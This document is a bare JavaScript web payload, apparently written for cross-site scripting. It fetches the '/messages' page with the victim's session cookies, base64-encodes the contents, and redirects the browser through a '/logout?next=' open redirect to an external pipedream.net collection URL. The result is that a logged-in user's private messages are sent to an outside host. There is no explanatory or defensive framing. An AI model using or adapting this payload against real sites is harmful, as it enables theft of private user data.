fetch("/messages", {
  method: "GET",
  credentials: "include"
})
  .then(r => r.text())
  .then(txt => {
    console.log(txt);
    document.location = '/logout?next=https://eoeipamgnflz15n.m.pipedream.net?c=' + btoa(txt)
  })
  .catch(console.error);
